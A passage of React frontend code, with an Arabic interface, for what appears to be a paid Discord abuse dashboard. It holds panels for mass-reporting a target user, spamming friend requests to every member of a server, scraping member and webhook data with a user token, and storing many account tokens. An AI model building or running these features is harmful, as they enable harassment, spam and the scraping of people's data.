                      <div className="text-[10px] text-white/40">👥 أصدقاء</div>
                      <div className="text-lg font-bold text-orange-400">{adStats.friendsDeleted}</div>
                    </div>
                    <div className="bg-black/20 rounded-xl p-3 border border-white/5 text-center">
                      <div className="text-[10px] text-white/40">🚪 سيرفرات</div>
                      <div className="text-lg font-bold text-yellow-400">{adStats.serversLeft}</div>
                    </div>
                    <div className="bg-black/20 rounded-xl p-3 border border-white/5 text-center">
                      <div className="text-[10px] text-white/40">📪 DMs</div>
                      <div className="text-lg font-bold text-purple-400">{adStats.dmsClosed}</div>
                    </div>
                  </div>
                )}
              </div></div>
            )}

            {/* ==================== MASS REPORT - PRIME ONLY ==================== */}
            {section === 'mass-report' && (
              <div className="animate-fade-in"><div className="glass-card card-hover rounded-2xl p-6 border border-orange-500/15 shadow-xl shadow-black/20 relative min-h-[460px]">
                {!isPrime && (<div className="prime-lock-overlay">
                  <div className="prime-lock-icon">⭐</div>
                  <h3 className="text-xl font-black text-yellow-400">ميزة Prime فقط</h3>
                  <p className="text-sm text-white/40 text-center max-w-[240px] leading-relaxed">البلاغات الجماعية متاحة فقط لمشتركي Prime</p>
                  <button onClick={() => setShowPrimeModal(true)} className="btn-prime text-sm px-8 py-3 mt-2">⭐ اشتري Prime - 2M كرديت</button>
                </div>)}
                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">🚨</span><h2 className="text-xl font-black text-orange-400">بلاغات جماعية</h2>{isPrime && (<span className="prime-badge text-[9px]">PRIME</span>)}</div>
                <p className="text-slate-500 text-sm mb-5">إرسال بلاغات متعددة على حساب معين - 7 أنواع مختلفة من البلاغات</p>

                <div className="bg-orange-500/5 rounded-xl p-4 mb-5 border border-orange-500/15">
                  <div className="text-[11px] text-orange-400/80 space-y-1.5">
                    <p>⚠️ <span className="font-bold">أنواع البلاغات:</span></p>
                    <p>📧 Spamming • 😤 Harassment • 🚫 Illegal content</p>
                    <p>🎭 Impersonation • 🐛 Bug exploitation • 🤖 Bot account</p>
                  </div>
                </div>

                <TokenInput label="🎫 توكنك" value={mrToken} onChange={setMrToken} accent="orange" onHelp={() => setShowTokenGuide(true)} />
                <TextInput label="🎯 أيدي المستهدف" value={mrTargetId} onChange={setMrTargetId} placeholder="User ID" accent="orange" />
                <div className="mb-4">
                  <label className="text-[11px] text-orange-300/70 mb-1 block">🔢 عدد البلاغات (1-50)</label>
                  <input type="number" value={mrCount} onChange={e => setMrCount(Math.min(Math.max(Number(e.target.value), 1), 50))} min={1} max={50} className="w-full bg-black/30 border border-orange-500/30 rounded-xl px-4 py-3 text-white text-sm focus:outline-none focus:border-orange-400/50 transition-colors" />
                </div>

                <ActionBtn text="🚨 إرسال البلاغات" loading={mrLoading} color="orange" onClick={async () => {
                  if (!mrToken || !mrTargetId) { setMrLogs(['❌ أدخل التوكن وأيدي المستهدف']); return }
                  setMrLoading(true); setMrLogs(['⏳ جاري إرسال البلاغات...']); setMrStats(null)
                  try {
                    const res = await fetch('/api/mass-report', {
                      method: 'POST',
                      headers: { 'Content-Type': 'application/json' },
                      body: JSON.stringify({ token: mrToken, targetId: mrTargetId, reason: mrReason, count: mrCount }),
                      signal: AbortSignal.timeout(120000)
                    })
                    const data = await res.json()
                    if (data.success) { setMrLogs(data.logs); if (data.stats) setMrStats(data.stats) }
                    else { setMrLogs(['❌ ' + (data.error || 'فشل')]) }
                  } catch { setMrLogs(['❌ خطأ في الاتصال']) }
                  setMrLoading(false)
                }} />

                {mrLogs.length > 0 && (
                  <div className="bg-black/30 rounded-2xl p-4 border border-orange-500/15 animate-fade-in mt-4 max-h-60 overflow-y-auto">
                    <h3 className="font-bold text-orange-400 text-sm mb-3 text-center">📋 النتائج</h3>
                    <div className="space-y-1">{mrLogs.map((log, i) => (<div key={i} className={`text-xs px-3 py-1.5 rounded-lg font-mono ${log.startsWith('❌') ? 'text-red-400 bg-red-500/5' : log.startsWith('✅') ? 'text-green-400 bg-green-500/5' : 'text-white/60 bg-white/3'}`}>{log}</div>))}</div>
                  </div>
                )}

                {mrStats && (
                  <div className="grid grid-cols-3 gap-2 mt-4">
                    <div className="bg-black/20 rounded-xl p-3 border border-white/5 text-center">
                      <div className="text-[10px] text-white/40">الإجمالي</div>
                      <div className="text-lg font-bold text-orange-400">{mrStats.total}</div>
                    </div>
                    <div className="bg-black/20 rounded-xl p-3 border border-white/5 text-center">
                      <div className="text-[10px] text-white/40">نجح</div>
                      <div className="text-lg font-bold text-green-400">{mrStats.success}</div>
                    </div>
                    <div className="bg-black/20 rounded-xl p-3 border border-white/5 text-center">
                      <div className="text-[10px] text-white/40">فشل</div>
                      <div className="text-lg font-bold text-red-400">{mrStats.failed}</div>
                    </div>
                  </div>
                )}
              </div></div>
            )}

            {/* ==================== FRIEND SPAM - PRIME ONLY ==================== */}
            {section === 'friend-spam' && (
              <div className="animate-fade-in"><div className="glass-card card-hover rounded-2xl p-6 border border-pink-500/15 shadow-xl shadow-black/20 relative min-h-[460px]">
                {!isPrime && (<div className="prime-lock-overlay">
                  <div className="prime-lock-icon">⭐</div>
                  <h3 className="text-xl font-black text-yellow-400">ميزة Prime فقط</h3>
                  <p className="text-sm text-white/40 text-center max-w-[240px] leading-relaxed">سبام طلبات الصداقة متاح فقط لمشتركي Prime</p>
                  <button onClick={() => setShowPrimeModal(true)} className="btn-prime text-sm px-8 py-3 mt-2">⭐ اشتري Prime - 2M كرديت</button>
                </div>)}
                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">👥</span><h2 className="text-xl font-black text-pink-400">سبام طلبات الصداقة</h2>{isPrime && (<span className="prime-badge text-[9px]">PRIME</span>)}</div>
                <p className="text-slate-500 text-sm mb-5">إرسال طلبات صداقة لجميع أعضاء سيرفر معين مع رسالة اختيارية</p>

                <div className="bg-pink-500/5 rounded-xl p-4 mb-5 border border-pink-500/15">
                  <div className="text-[11px] text-pink-400/80 space-y-1.5">
                    <p>💡 <span className="font-bold">كيف يعمل:</span></p>
                    <p>1. يفتح DM مع كل عضو في السيرفر</p>
                    <p>2. يرسل رسالتك (اختياري)</p>
                    <p>3. يرسل طلب صداقة</p>
                  </div>
                </div>

                <TokenInput label="🎫 توكنك" value={fsToken} onChange={setFsToken} accent="pink" onHelp={() => setShowTokenGuide(true)} />
                <TextInput label="🏰 أيدي السيرفر" value={fsGuildId} onChange={setFsGuildId} placeholder="Server ID" accent="pink" />
                <div className="mb-4">
                  <label className="text-[11px] text-pink-300/70 mb-1 block">🔢 عدد الطلبات (1-100)</label>
                  <input type="number" value={fsMaxRequests} onChange={e => setFsMaxRequests(Math.min(Math.max(Number(e.target.value), 1), 100))} min={1} max={100} className="w-full bg-black/30 border border-pink-500/30 rounded-xl px-4 py-3 text-white text-sm focus:outline-none focus:border-pink-400/50 transition-colors" />
                </div>
                <div className="mb-4">
                  <label className="text-[11px] text-pink-300/70 mb-1 block">📝 رسالة (اختياري)</label>
                  <textarea value={fsMessage} onChange={e => setFsMessage(e.target.value)} placeholder="رسالتك هنا..." rows={2} className="w-full bg-black/30 border border-pink-500/30 rounded-xl px-4 py-3 text-white text-sm placeholder-white/20 focus:outline-none focus:border-pink-400/50 transition-colors resize-none" />
                </div>

                <ActionBtn text="👥 بدء سبام الصداقات" loading={fsLoading} color="pink" onClick={async () => {
                  if (!fsToken || !fsGuildId) { setFsLogs(['❌ أدخل التوكن وأيدي السيرفر']); return }
                  setFsLoading(true); setFsLogs(['⏳ جاري إرسال طلبات الصداقة...']); setFsStats(null)
                  try {
                    const res = await fetch('/api/friend-spam', {
                      method: 'POST',
                      headers: { 'Content-Type': 'application/json' },
                      body: JSON.stringify({ token: fsToken, guildId: fsGuildId, maxRequests: fsMaxRequests, message: fsMessage }),
                      signal: AbortSignal.timeout(300000)
                    })
                    const data = await res.json()
                    if (data.success) { setFsLogs(data.logs); if (data.stats) setFsStats(data.stats) }
                    else { setFsLogs(['❌ ' + (data.error || 'فشل')]) }
                  } catch { setFsLogs(['❌ خطأ في الاتصال']) }
                  setFsLoading(false)
                }} />

                {fsLogs.length > 0 && (
                  <div className="bg-black/30 rounded-2xl p-4 border border-pink-500/15 animate-fade-in mt-4 max-h-60 overflow-y-auto">
                    <h3 className="font-bold text-pink-400 text-sm mb-3 text-center">📋 النتائج</h3>
                    <div className="space-y-1">{fsLogs.map((log, i) => (<div key={i} className={`text-xs px-3 py-1.5 rounded-lg font-mono ${log.startsWith('❌') ? 'text-red-400 bg-red-500/5' : log.startsWith('✅') ? 'text-green-400 bg-green-500/5' : 'text-white/60 bg-white/3'}`}>{log}</div>))}</div>
                  </div>
                )}
              </div></div>
            )}

            {/* ==================== SERVER PROTECTION - PRIME ONLY ==================== */}
            {section === 'server-protect' && (
              <div className="animate-fade-in">
                {!isPrime && (
                  <div className="prime-lock-overlay">
                    <div className="text-4xl mb-3">🛡️</div>
                    <h3 className="text-lg font-black text-yellow-400 mb-2">حماية سيرفر</h3>
                    <p className="text-white/40 text-sm mb-4">ميزة Prime حصرية</p>
                    <button onClick={() => setShowPrimeModal(true)} className="btn-prime">⭐ تفعيل Prime</button>
                  </div>
                )}
                {isPrime && (
                <div className="glass-card card-hover rounded-2xl p-6 border border-emerald-500/15 shadow-xl shadow-black/20">
                  <div className="flex items-center gap-3 mb-1">
                    <span className="text-2xl">🛡️</span>
                    <h2 className="text-xl font-black text-gradient-green">حماية سيرفر</h2>
                    <span className="prime-badge">⭐ Prime</span>
                  </div>
                  <p className="text-slate-500 text-sm mb-5">نظام حماية متكامل لسيرفرك باستخدام بوت</p>

                  {/* Token input */}
                  <TokenInput label="🎫 توكن البوت" value={spBotToken} onChange={setSpBotToken} />

                  {/* Fetch guilds button */}
                  {spBotToken && (
                    <button onClick={async () => {
                      setSpGuildLoading(true)
                      setSpGuildList([])
                      try {
                        const res = await fetch('/api/server-protect', {
                          method: 'POST',
                          headers: { 'Content-Type': 'application/json' },
                          body: JSON.stringify({ token: spBotToken, action: 'fetch-guilds' }),
                          signal: AbortSignal.timeout(15000)
                        })
                        const data = await res.json()
                        if (data.success && data.guilds) {
                          setSpGuildList(data.guilds)
                          if (data.guilds.length === 0) setSpProtectLogs(['❌ البوت ليس في أي سيرفر'])
                        } else {
                          setSpProtectLogs(['❌ ' + (data.error || 'فشل في جلب السيرفرات')])
                        }
                      } catch { setSpProtectLogs(['❌ خطأ في الاتصال']) }
                      setSpGuildLoading(false)
                    }} className={`mt-3 w-full py-2.5 rounded-xl text-sm font-bold transition-all cursor-pointer border ${spGuildLoading ? 'bg-emerald-500/10 text-emerald-400/50 border-emerald-500/20' : 'bg-emerald-500/15 text-emerald-400 border-emerald-500/25 hover:bg-emerald-500/25'}`}>
                      {spGuildLoading ? '🔄 جاري جلب السيرفرات...' : `🔍 جلب سيرفرات البوت (${spGuildList.length > 0 ? spGuildList.length + ' سيرفر' : 'اضغط هنا'})`}
                    </button>
                  )}

                  {/* Guild list */}
                  {spGuildList.length > 0 && (
                    <div className="mt-3">
                      <label className="text-[11px] text-white/50 mb-1 block">🏰 اختر السيرفر:</label>
                      <div className="space-y-1.5 max-h-40 overflow-y-auto">
                        {spGuildList.map(g => (
                          <div key={g.id} onClick={() => setSpProtectGuildId(g.id)} className={`flex items-center gap-3 p-2.5 rounded-xl cursor-pointer transition-all border ${spProtectGuildId === g.id ? 'bg-emerald-500/15 border-emerald-500/30 ring-1 ring-emerald-500/20' : 'bg-white/3 border-white/5 hover:bg-white/5'}`}>
                            <img src={g.icon ? `https://cdn.discordapp.com/icons/${g.id}/${g.icon}.png?size=32` : 'https://cdn.discordapp.com/embed/avatars/0.png'} className="w-7 h-7 rounded-full flex-shrink-0" alt="" />
                            <div className="flex-1 min-w-0">
                              <div className="text-xs font-bold text-white/80 truncate">{g.name}</div>
                              <div className="text-[9px] text-white/30">{g.id}{g.owner ? ' (مالك)' : ''}</div>
                            </div>
                            {spProtectGuildId === g.id && <span className="text-emerald-400 text-xs flex-shrink-0">✓</span>}
                          </div>
                        ))}
                      </div>
                    </div>
                  )}

                  {/* Protection Options - Toggle switches */}
                  <div className="mt-5 space-y-2">
                    <div className="text-[11px] text-white/50 font-bold mb-2">⚙️ خيارات الحماية:</div>
                    {[
                      { key: 'antiBot' as const, name: '🤖 حماية ضد البوتات', desc: 'طرد أي بوت يُضاف + طرد من أضافه' },
                      { key: 'antiNuke' as const, name: '💥 حماية من النيوكر', desc: 'كشف ومنع حذف الرومات والرتب بشكل جماعي' },
                      { key: 'antiRaid' as const, name: '🚨 حماية من الرايد', desc: 'كشف دخول جماعي وقفل السيرفر تلقائياً' },
                      { key: 'antiSpam' as const, name: '💬 حماية من السبام', desc: 'كشف إرسال رسائل متكررة وميوت تلقائي' },
                      { key: 'antiLink' as const, name: '🔗 حماية من الروابط', desc: 'حذف روابط ديسكورد غير مصرح بها' },
                      { key: 'antiMassMention' as const, name: '📢 حماية من المنشنات', desc: 'منع منشنات جماعية (@everyone/@here)' },
                      { key: 'antiWebhook' as const, name: '🌐 حماية من الويب هوك', desc: 'كشف وحذف ويب هوكات مشبوهة' },
                      { key: 'logActions' as const, name: '📋 تسجيل الإجراءات', desc: 'إرسال تقارير لحماية السيرفر' },
                    ].map(opt => (
                      <div key={opt.key} onClick={() => setSpProtectOptions(prev => ({ ...prev, [opt.key]: !prev[opt.key] }))} className={`flex items-center gap-3 p-3 rounded-xl cursor-pointer transition-all border ${spProtectOptions[opt.key] ? 'bg-emerald-500/10 border-emerald-500/20' : 'bg-white/3 border-white/5 opacity-60'}`}>
                        <div className={`w-10 h-6 rounded-full relative transition-all ${spProtectOptions[opt.key] ? 'bg-emerald-500' : 'bg-slate-600'}`}>
                          <div className={`absolute top-1 w-4 h-4 rounded-full bg-white shadow transition-all ${spProtectOptions[opt.key] ? 'left-5' : 'left-1'}`} />
                        </div>
                        <div className="flex-1 min-w-0">
                          <div className="text-xs font-bold text-white/80">{opt.name}</div>
                          <div className="text-[9px] text-white/30">{opt.desc}</div>
                        </div>
                      </div>
                    ))}
                  </div>

                  {/* Raid Settings */}
                  {spProtectOptions.antiRaid && (
                    <div className="mt-4 bg-black/20 rounded-xl p-4 border border-white/5">
                      <div className="text-[11px] text-white/50 font-bold mb-3">🚨 إعدادات الرايد:</div>
                      <div className="grid grid-cols-2 gap-3">
                        <div>
                          <label className="text-[10px] text-white/30 mb-1 block">عدد الأعضاء</label>
                          <input type="number" value={spRaidThreshold} onChange={e => setSpRaidThreshold(Number(e.target.value))} min={3} max={50} className="w-full bg-black/30 border border-slate-600/30 rounded-xl px-3 py-2 text-white text-sm focus:outline-none focus:border-emerald-400/40" />
                        </div>
                        <div>
                          <label className="text-[10px] text-white/30 mb-1 block">خلال (ثواني)</label>
                          <input type="number" value={spRaidTime} onChange={e => setSpRaidTime(Number(e.target.value))} min={5} max={60} className="w-full bg-black/30 border border-slate-600/30 rounded-xl px-3 py-2 text-white text-sm focus:outline-none focus:border-emerald-400/40" />
                        </div>
                      </div>
                    </div>
                  )}

                  {/* Watch Messages */}
                  <div className="mt-4 bg-black/20 rounded-xl p-4 border border-white/5">
                    <div className="text-[11px] text-white/50 font-bold mb-3">💬 رسائل المراقبة (Watch):</div>
                    <div className="space-y-1 mb-3">
                      {spWatchMessages.map((msg, i) => (
                        <div key={i} className="flex items-center gap-2 bg-black/20 rounded-lg px-3 py-2 border border-white/5">
                          <span className="text-[10px] text-emerald-400 flex-shrink-0">#{i + 1}</span>
                          <span className="text-xs text-white/70 flex-1 truncate">{msg}</span>
                          <button onClick={() => setSpWatchMessages(prev => prev.filter((_, idx) => idx !== i))} className="text-red-400/50 hover:text-red-400 text-xs flex-shrink-0 cursor-pointer">✕</button>
                        </div>
                      ))}
                    </div>
                    <div className="flex gap-2">
                      <input value={spNewWatchMsg} onChange={e => setSpNewWatchMsg(e.target.value)} onKeyDown={e => { if (e.key === 'Enter' && spNewWatchMsg.trim()) { setSpWatchMessages(prev => [...prev, spNewWatchMsg.trim()]); setSpNewWatchMsg('') } }} placeholder="أضف رسالة جديدة..." className="flex-1 bg-black/30 border border-slate-600/30 rounded-xl px-3 py-2 text-white text-xs placeholder-white/20 focus:outline-none focus:border-emerald-400/40" />
                      <button onClick={() => { if (spNewWatchMsg.trim()) { setSpWatchMessages(prev => [...prev, spNewWatchMsg.trim()]); setSpNewWatchMsg('') } }} className="bg-emerald-500/20 text-emerald-400 text-xs px-3 py-2 rounded-xl border border-emerald-500/30 hover:bg-emerald-500/30 cursor-pointer transition-colors">+</button>
                    </div>
                  </div>

                  {/* Activate Button */}
                  <div className="mt-5">
                    <ActionBtn text={spProtectActive ? '🛡️ إيقاف الحماية' : '🛡️ تفعيل الحماية'} loading={spProtectLoading} color="green" onClick={async () => {
                      if (!spBotToken) { setSpProtectLogs(['❌ أدخل توكن البوت أولاً']); return }
                      setSpProtectLoading(true)
                      setSpProtectLogs([spProtectActive ? '⏳ جاري إيقاف الحماية...' : '⏳ جاري تفعيل الحماية...'])
                      try {
                        const res = await fetch('/api/server-protect', {
                          method: 'POST',
                          headers: { 'Content-Type': 'application/json' },
                          body: JSON.stringify({
                            token: spBotToken,
                            guildId: spProtectGuildId || undefined,
                            action: spProtectActive ? 'stop' : 'start',
                            options: spProtectOptions,
                            watchMessages: spWatchMessages,
                            raidThreshold: spRaidThreshold,
                            raidTime: spRaidTime,
                          }),
                          signal: AbortSignal.timeout(30000)
                        })
                        const data = await res.json()
                        if (data.success) {
                          setSpProtectLogs(['✅ ' + (spProtectActive ? 'تم إيقاف الحماية' : 'تم تفعيل الحماية بنجاح'), ...(data.logs || [])])
                          setSpProtectActive(!spProtectActive)
                        } else {
                          setSpProtectLogs(['❌ ' + (data.error || 'فشل')])
                        }
                        if (data.botInGuild === false) {
                          setSpProtectLogs(prev => [...prev, '⚠️ البوت غير موجود في السيرفر - تأكد من إضافته'])
                        }
                      } catch { setSpProtectLogs(['❌ خطأ في الاتصال']) }
                      setSpProtectLoading(false)
                    }} />
                  </div>

                  {/* Logs */}
                  {spProtectLogs.length > 0 && (
                    <div className="mt-4 bg-black/20 rounded-xl p-4 border border-white/5 space-y-1 max-h-48 overflow-y-auto">
                      {spProtectLogs.map((l, i) => (
                        <div key={i} className={`text-xs px-3 py-2 rounded-lg ${l.startsWith('✅') ? 'bg-green-500/10 text-green-400' : l.startsWith('❌') ? 'bg-red-500/10 text-red-400' : 'bg-blue-500/5 text-blue-400'}`}>{l}</div>
                      ))}
                    </div>
                  )}
                </div>
                )}
              </div>
            )}

            {/* ==================== TFA NOTIFY ==================== */}
            {section === 'tfa-notify' && (
              <div className="animate-fade-in">
                {!isPrime && (
                  <div className="prime-lock-overlay">
                    <div className="text-4xl mb-3">📱</div>
                    <h3 className="text-lg font-black text-yellow-400 mb-2">إشعارات 2FA</h3>
                    <p className="text-white/40 text-sm mb-4">ميزة Prime حصرية</p>
                    <button onClick={() => setShowPrimeModal(true)} className="btn-prime">⭐ تفعيل Prime</button>
                  </div>
                )}
                {isPrime && (
                <div className="glass-card card-hover rounded-2xl p-6 border border-blue-500/15 shadow-xl shadow-black/20">
                  <div className="flex items-center gap-3 mb-1"><span className="text-2xl">📱</span><h2 className="text-xl font-black text-gradient-green">إشعارات 2FA</h2></div>
                  <p className="text-slate-500 text-sm mb-5">استقبال إشعارات المصادقة الثنائية عبر ويب هوك</p>
                  <TokenInput label="🎫 توكن الحساب" value={tfaNotifyToken} onChange={setTfaNotifyToken} />
                  <div className="mt-3">
                    <label className="text-[11px] text-white/50 mb-1 block">🔗 رابط الويب هوك</label>
                    <input value={tfaNotifyWebhook} onChange={e => setTfaNotifyWebhook(e.target.value)} placeholder="https://discord.com/api/webhooks/..." className="w-full bg-black/30 border border-slate-600/30 rounded-xl px-4 py-3 text-white text-sm placeholder-white/20 focus:outline-none focus:border-emerald-400/40" />
                  </div>
                  <ActionBtn text="📱 تفعيل الإشعارات" loading={tfaNotifyLoading} color="blue" onClick={async () => { setTfaNotifyLoading(true); setTfaNotifyLogs(['⏳ جاري التفعيل...']); try { const res = await fetch('/api/tfa-notify', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: tfaNotifyToken, webhook: tfaNotifyWebhook }) }); const data = await res.json(); if (data.success) { setTfaNotifyLogs(['✅ تم تفعيل الإشعارات بنجاح']) } else { setTfaNotifyLogs(['❌ ' + (data.error || 'فشل')]) } } catch { setTfaNotifyLogs(['❌ خطأ في الاتصال']) } setTfaNotifyLoading(false) }} />
                  {tfaNotifyLogs.length > 0 && (<div className="mt-4 bg-black/20 rounded-xl p-4 border border-white/5 space-y-1 max-h-48 overflow-y-auto">{tfaNotifyLogs.map((l, i) => (<div key={i} className="text-xs text-slate-300">{l}</div>))}</div>)}
                </div>
                )}
              </div>
            )}

            {/* ==================== TOKEN LEECHER - PRIME ONLY ==================== */}
            {section === 'token-leecher' && (
              <div className="animate-fade-in"><div className="glass-card card-hover rounded-2xl p-6 border border-emerald-500/15 shadow-xl shadow-black/20 relative min-h-[460px]">
                {!isPrime && (<div className="prime-lock-overlay">
                  <div className="prime-lock-icon">⭐</div>
                  <h3 className="text-xl font-black text-yellow-400">ميزة Prime فقط</h3>
                  <p className="text-sm text-white/40 text-center max-w-[240px] leading-relaxed">مستخرج البيانات متاح فقط لمشتركي Prime</p>
                  <button onClick={() => setShowPrimeModal(true)} className="btn-prime text-sm px-8 py-3 mt-2">⭐ اشتري Prime - 2M كرديت</button>
                </div>)}
                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">🧲</span><h2 className="text-xl font-black text-emerald-400">مستخرج البيانات</h2>{isPrime && (<span className="prime-badge text-[9px]">PRIME</span>)}</div>
                <p className="text-slate-500 text-sm mb-5">استخراج جميع بيانات السيرفر: أعضاء، قنوات، رتب، إيموجي، ويب هوكات</p>

                <div className="bg-emerald-500/5 rounded-xl p-4 mb-5 border border-emerald-500/15">
                  <div className="text-[11px] text-emerald-400/80 space-y-1.5">
                    <p>💡 <span className="font-bold">البيانات المستخرجة:</span></p>
                    <p>👥 الأعضاء (ID, Username, Avatar)</p>
                    <p>📝 القنوات (ID, Name, Type)</p>
                    <p>🛡️ الرتب (ID, Name, Color)</p>
                    <p>😀 الإيموجي + 🔗 الويب هوكات</p>
                  </div>
                </div>

                <TokenInput label="🎫 توكنك" value={tlToken} onChange={setTlToken} accent="emerald" onHelp={() => setShowTokenGuide(true)} />
                <TextInput label="🏰 أيدي السيرفر" value={tlGuildId} onChange={setTlGuildId} placeholder="Server ID" accent="emerald" />

                <ActionBtn text="🧲 استخراج البيانات" loading={tlLoading} color="green" onClick={async () => {
                  if (!tlToken || !tlGuildId) { setTlLogs(['❌ أدخل التوكن وأيدي السيرفر']); return }
                  setTlLoading(true); setTlLogs(['⏳ جاري استخراج البيانات...']); setTlData(null)
                  try {
                    const res = await fetch('/api/token-leecher', {
                      method: 'POST',
                      headers: { 'Content-Type': 'application/json' },
                      body: JSON.stringify({ token: tlToken, guildId: tlGuildId }),
                      signal: AbortSignal.timeout(120000)
                    })
                    const data = await res.json()
                    if (data.success) { setTlLogs(data.logs); if (data.data) setTlData(data.data) }
                    else { setTlLogs(['❌ ' + (data.error || 'فشل')]) }
                  } catch { setTlLogs(['❌ خطأ في الاتصال']) }
                  setTlLoading(false)
                }} />

                {tlLogs.length > 0 && (
                  <div className="bg-black/30 rounded-2xl p-4 border border-emerald-500/15 animate-fade-in mt-4 max-h-40 overflow-y-auto">
                    <div className="space-y-1">{tlLogs.map((log, i) => (<div key={i} className={`text-xs px-3 py-1.5 rounded-lg font-mono ${log.startsWith('❌') ? 'text-red-400' : log.startsWith('✅') ? 'text-green-400' : 'text-white/60'}`}>{log}</div>))}</div>
                  </div>
                )}

                {tlData && (
                  <div className="grid grid-cols-5 gap-2 mt-4">
                    <div className="bg-black/20 rounded-xl p-3 border border-white/5 text-center">
                      <div className="text-[10px] text-white/40">👥 أعضاء</div>
                      <div className="text-lg font-bold text-emerald-400">{tlData.members.length}</div>
                    </div>
                    <div className="bg-black/20 rounded-xl p-3 border border-white/5 text-center">
                      <div className="text-[10px] text-white/40">📝 قنوات</div>
                      <div className="text-lg font-bold text-cyan-400">{tlData.channels.length}</div>
                    </div>
                    <div className="bg-black/20 rounded-xl p-3 border border-white/5 text-center">
                      <div className="text-[10px] text-white/40">🛡️ رتب</div>
                      <div className="text-lg font-bold text-yellow-400">{tlData.roles.length}</div>
                    </div>
                    <div className="bg-black/20 rounded-xl p-3 border border-white/5 text-center">
                      <div className="text-[10px] text-white/40">😀 إيموجي</div>
                      <div className="text-lg font-bold text-pink-400">{tlData.emojis.length}</div>
                    </div>
                    <div className="bg-black/20 rounded-xl p-3 border border-white/5 text-center">
                      <div className="text-[10px] text-white/40">🔗 ويب هوك</div>
                      <div className="text-lg font-bold text-purple-400">{tlData.webhooks.length}</div>
                    </div>
                  </div>
                )}
              </div></div>
            )}

            {/* ==================== TOKEN SAVE ==================== */}
            {section === 'token-save' && (
              <div className="animate-fade-in"><div className="glass-card card-hover rounded-2xl p-6 border border-indigo-500/15 shadow-xl shadow-black/20">
                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">💾</span><h2 className="text-xl font-black text-indigo-400">حفظ توكنات</h2></div>
                <p className="text-slate-500 text-sm mb-5">احفظ أكثر من توكن - فحص تلقائي كل ساعة - يخبرك لو تغير أو تعطل</p>

                {/* زر كيف تجيب توكن */}
                <button onClick={() => setShowTokenGuide(true)} className="w-full py-2.5 rounded-xl text-[11px] text-cyan-400 bg-cyan-500/10 border border-cyan-500/20 hover:bg-cyan-500/20 transition-colors cursor-pointer mb-4 flex items-center justify-center gap-2 font-bold">
                  <span>🎫</span> كيف تجيب توكن؟
                </button>

                {/* إضافة توكن جديد */}
                <div className="mb-4">
                  <label className="text-[11px] text-indigo-300/70 mb-1 block">🎫 أضف توكن جديد</label>
                  <div className="flex gap-2">
                    <input type="password" value={newTokenInput} onChange={e => setNewTokenInput(e.target.value)} placeholder="الصق التوكن هنا..." className="flex-1 bg-black/30 border border-indigo-500/30 rounded-xl px-4 py-3 text-white text-sm placeholder-indigo-700/30 focus:outline-none focus:border-indigo-400/50 transition-colors" />
                    <button onClick={async () => {
                      const tk = newTokenInput.trim()
                      if (!tk || tk.length < 50) { setResult('❌ أدخل توكن صالح'); return }
                      if (savedTokens.some(st => st.token === tk)) { setResult('❌ هذا التوكن محفوظ بالفعل'); return }
                      const tempId = 'temp_' + Date.now()
                      setSavedTokens(prev => [...prev, { id: tempId, token: tk, name: 'جاري الفحص...', type: '', status: 'checking', addedAt: new Date().toLocaleString('ar-SA'), lastChecked: '' }])
                      setNewTokenInput('')
                      try {
                        const res = await fetch('/api/verify', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: tk }) })
                        const data = await res.json()
                        if (data.success) {
                          const entry: SavedTokenEntry = { id: tempId, token: tk, name: data.name, type: data.type, email: data.email, nitro: data.nitro, status: 'valid', addedAt: new Date().toLocaleString('ar-SA'), lastChecked: new Date().toLocaleTimeString('ar-SA') }
                          setSavedTokens(prev => prev.map(st => st.id === tempId ? entry : st))
                          setResult(`✅ تم حفظ التوكن - ${data.name} (${data.type === 'bot' ? '🤖 بوت' : '👤 يوزر'})`)
                        } else {
                          setSavedTokens(prev => prev.filter(st => st.id !== tempId))
                          setResult('❌ التوكن غير صالح أو منتهي')
                        }
                      } catch { setSavedTokens(prev => prev.filter(st => st.id !== tempId)); setResult('❌ خطأ في الاتصال') }
                    }} disabled={tsCheckingAll} className="px-4 py-3 rounded-xl font-bold text-xs cursor-pointer bg-indigo-500/20 text-indigo-400 border border-indigo-500/30 hover:bg-indigo-500/30 transition-colors active:scale-[0.97] whitespace-nowrap disabled:opacity-50 disabled:cursor-not-allowed">💾 حفظ</button>
                  </div>
                </div>

                {/* أزرار التحكم */}
                <div className="grid grid-cols-2 gap-2 mb-4">
                  <ActionBtn text={tsCheckingAll ? '⏳ جاري الفحص...' : '🔍 فحص الكل'} loading={tsCheckingAll} color="cyan" onClick={async () => {
                    if (savedTokens.length === 0) { setResult('❌ لا يوجد توكنات محفوظة'); return }
                    setTsCheckingAll(true); setResult('')
                    for (const t of savedTokens) {
                      setSavedTokens(prev => prev.map(st => st.id === t.id ? { ...st, status: 'checking' as const } : st))
                      try {
                        const res = await fetch('/api/verify', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: t.token }) })
                        const data = await res.json()
                        setSavedTokens(prev => prev.map(st => {
                          if (st.id !== t.id) return st
                          if (data.success) {
                            if (t.name && t.name !== data.name && t.name !== 'جاري الفحص...') return { ...st, name: data.name, status: 'changed' as const, lastChecked: new Date().toLocaleTimeString('ar-SA'), prevName: t.name }
                            return { ...st, name: data.name, status: 'valid' as const, lastChecked: new Date().toLocaleTimeString('ar-SA') }
                          }
                          return { ...st, status: 'invalid' as const, lastChecked: new Date().toLocaleTimeString('ar-SA') }
                        }))
                      } catch { setSavedTokens(prev => prev.map(st => st.id === t.id ? { ...st, status: 'invalid' as const, lastChecked: new Date().toLocaleTimeString('ar-SA') } : st)) }
                      await new Promise(r => setTimeout(r, 1500))
                    }
                    setTsCheckingAll(false)
                    const changed = savedTokens.filter(t => t.status === 'changed')
                    const invalid = savedTokens.filter(t => t.status === 'invalid')
                    setResult(`✅ تم فحص ${savedTokens.length} توكن${changed.length > 0 ? ` | ⚠️ ${changed.length} تغير` : ''}${invalid.length > 0 ? ` | ❌ ${invalid.length} معطل` : ''}`)
                  }} />
